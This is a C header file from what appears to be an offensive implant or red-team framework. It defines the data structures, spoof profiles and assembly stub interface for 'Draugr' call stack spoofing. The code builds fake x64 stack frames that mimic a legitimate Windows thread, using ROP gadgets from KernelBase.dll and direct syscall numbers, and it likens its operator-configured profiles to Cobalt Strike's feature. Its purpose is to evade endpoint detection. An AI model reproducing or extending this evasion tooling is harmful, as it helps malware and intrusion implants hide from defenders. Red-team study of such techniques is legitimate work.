#ifndef STARBURST_EVASION_SPOOF_H
#define STARBURST_EVASION_SPOOF_H

#include <windows.h>
#include <stdint.h>

/*
 * Draugr call stack spoofing - N-frame configurable system.
 *
 * Builds synthetic x64 call stack frames that mimic a legitimate
 * Windows thread origin. Operators define custom frame sequences
 * in spoof_profiles.h (similar to Cobalt Strike's set_callstack).
 *
 * Uses JMP [RBX] gadgets from KernelBase.dll as ROP trampolines.
 */

/* ─── spoof profiles (compile-time selection) ─── */

#define SPOOF_PROFILE_OFF    0
#define SPOOF_PROFILE_THREAD 1
#define SPOOF_PROFILE_WORKER 2
#define SPOOF_PROFILE_CUSTOM 3

#ifndef SPOOF_PROFILE
#define SPOOF_PROFILE SPOOF_PROFILE_THREAD
#endif

#ifndef SPOOF_MAX_FRAMES
#define SPOOF_MAX_FRAMES 10
#endif

/* ─── FUNCTION_CALL: universal interface for spoofed calls ─── */

#define spoof_arg(x) (ULONG_PTR)(x)

typedef struct {
    PVOID     ptr;
    DWORD     ssn;
    int       argc;
    ULONG_PTR args[12];
} FUNCTION_CALL;

/* ─── DRAUGR_PARAMETERS: passed to the ASM stub ───
 *
 * Layout must match draugr.x64.asm exactly.
 * The Frames array is built bottom-up by the ASM loop.
 */

typedef struct {
    PVOID Fixup;                        // +0x00
    PVOID OriginalReturnAddress;        // +0x08
    PVOID Rbx;                          // +0x10
    PVOID Rdi;                          // +0x18
    PVOID Ssn;                          // +0x20
    PVOID Trampoline;                   // +0x28
    PVOID TrampolineStackSize;          // +0x30
    PVOID FrameCount;                   // +0x38
    PVOID TotalFrameStackSize;          // +0x40
    PVOID Rsi;                          // +0x48
    PVOID R12;                          // +0x50
    PVOID R13;                          // +0x58
    PVOID R14;                          // +0x60
    PVOID R15;                          // +0x68
    struct {
        PVOID StackSize;                // +0x70 + i*0x10
        PVOID ReturnAddress;            // +0x78 + i*0x10
    } Frames[SPOOF_MAX_FRAMES];
} DRAUGR_PARAMETERS;

/* ─── SPOOF_STATE: runtime state stored in INSTANCE.evasion ─── */

typedef struct {
    PVOID  gadget_module;
    PVOID  cached_gadgets[16];
    DWORD  gadget_count;

    DWORD  frame_count;
    struct {
        PVOID return_address;
        PVOID stack_size;
    } resolved_frames[SPOOF_MAX_FRAMES];

    bool   initialized;
} SPOOF_STATE;

/* ─── x64 UNWIND_INFO parsing types ─── */

typedef unsigned char UBYTE;

typedef union {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} SPOOF_UNWIND_CODE;

typedef struct {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    SPOOF_UNWIND_CODE UnwindCode[1];
} SPOOF_UNWIND_INFO;

/* ─── ASM stub declaration ─── */

extern "C" PVOID draugr_stub(
    PVOID, PVOID, PVOID, PVOID,
    DRAUGR_PARAMETERS*, PVOID, SIZE_T,
    PVOID, PVOID, PVOID, PVOID,
    PVOID, PVOID, PVOID, PVOID
);

#endif
